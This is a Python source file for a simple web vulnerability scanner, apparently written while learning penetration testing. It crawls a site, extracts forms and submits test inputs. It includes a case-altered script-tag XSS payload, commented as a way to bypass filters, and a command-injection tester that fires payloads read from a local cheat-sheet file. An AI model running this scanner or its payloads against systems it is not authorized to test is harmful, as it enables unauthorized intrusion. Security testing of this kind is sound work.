#!/usr/bin/env python
import re
import requests
import urlparse
from bs4 import BeautifulSoup


class Scanner:
    def __init__(self, url):  # initilaizer method
        self.target_url = url  # global variable
        self.target_links = []  # list to add target links in
        self.session = requests.session()  # we  are creating a session opbject representing our session in case that
        # some websites need us to login

    # extracting all links in a given url
    def extract_links_from(self, url):
        response = self.session.get(url)
        #print(response.content)
        return re.findall('(?:href=")(.*?)"', response.content)

    # crwaling a given url and storing the links in the target_links variable
    def crawl(self, url=None):  # none makes us able to use the method without specifiying a url when calling
        #print(self.target_links)

        if url == None:
            url = self.target_url

        href_links = self.extract_links_from(url)
        #print(href_links)
        for link in href_links:
            link = urlparse.urljoin(url, link)  # making a proper url


            if "#" in link:  # some liks have # which refers to a replacbale part in a web page, but the page itself is
                # same.This is done using javascript.
                link = link.split('#')[0]

            if self.target_url in link and link not in self.target_links and "logout" not in link:  # to not have
                # duplicate links stored in the list, if a link contains the word logout we dont access cuz we wanna keep
                # session
                self.target_links.append(link)  # appending links that we find in this list
                print(link)
                self.crawl(link)  # recursive line to go to link passed and discovering all the links in there


    # extracts forms from a given url
    def extract_forms(self, url):
        response = self.session.get(url)
        parsedHtml = BeautifulSoup(response.content, features="lxml")
        forms_list = parsedHtml.findAll("form")
        return forms_list

    # submits a given form with the provided values
    def submit_form(self, form, value, url):
        action = form.get("action")
        post_url = urlparse.urljoin(url, action)
        method = form.get("method")
        inputs_lists = form.find_all_next("input")
        post_data = {}
        for input in inputs_lists:
            input_name = input.get("name")
            input_type = input.get("type")  # we filter it cuz we only need inputs with type text
            input_value = input.get("value")
            if input_type == "text":
                input_value = value  # set value of input as we want to submit

            post_data[input_name] = input_value
            # now we have a dictionary element(s) of type 'input_name' : input_value, now we only need to post it
            # since not all forms use post, we need to check if its using get
        if method == "post":
            result = self.session.post(post_url, data=post_data)
        else:
            result = self.session.get(post_url, params=post_data)

        return result

    # runs the command injection scanner
    def run_command_injection_scanner(self):
        # we crawl and get all of the links realted to one main link
        # then we run this method
        self.crawl()
        for link in self.target_links:

            # we extract forms on the current link first
            forms = self.extract_forms(link)

            # now test each form in this link for vulnerabliliteis
            for form in forms:
                print("[+] Testing form in " + link)
                #print("Form tested: "+str(form))
                print("Command injection vulnerability found ? " + str(self.test_command_injection_in_form(form, link)))

            # now we test the link itself to see if its sends any get requests, its sending data to the web application
            if "?" in link:
                print("[+] The following link exposes 'GET' data which might be sensitive ! --> " + link)

            print("")

    # runs the xss in forms scanner
    def run_xss_form_scanner(self):
        # we crawl and get all of the links realted to one main link
        # then we run this method
        self.crawl()
        for link in self.target_links:

            # we extract forms on the current link first
            forms = self.extract_forms(link)

            # now test each form in this link for vulnerabliliteis
            for form in forms:
                print("[+] Testing form in " + link)
                print("XSS refelcted vulnerability found ? " + str(self.test_xss_in_form(form, link)))

            # now we test the link itself to see if its sends any get requests, its sending data to the web application
            if "?" in link:
                print("[+] The following link exposes 'GET' data which might be sensitive ! --> " + link)

            print("")


    def test_xss_in_form(self, form, url):
        # xss_test_script = "<script>alert('deezo')</script>"
        xss_test_script = "<sCript>alert('deezo')</scrIPt>"  # Changing a bit in the letters to bypass security
        # now we need to submit this form with the custom script
        response = self.submit_form(form, xss_test_script, url)
        if xss_test_script in response.content:
            return True  # means that the webpage and form are vulnerable


    def test_command_injection_in_form(self, form, url):

        # the way im checking if the exploit worked is if the content length has increased from a failed attempt.
        lengths_total = 0
        for x in range(0,5):  # doing it 5 times because some websites might have different content each time, so I take
            # an avg
            response = self.submit_form(form, '', url)
            lengths_total += len(response.content)

        original_length = lengths_total / 5
        # print(original_length)

        # accessing my cheat sheet that contains several tests for command injection and reading each line
        myfile = open("../../opt/Vulnerability-scanner-resources/command_injection_cheat_sheet", "r")
        while myfile:
            line = myfile.readline()
            command_injection_test_script = line
            response = self.submit_form(form, command_injection_test_script, url)
            if len(response.content) > original_length:  # comapring avg size of orifinal size with the new size I
                # received
                # print(response.content)
                return True

            if line == "":
                break

        myfile.close()

        return False
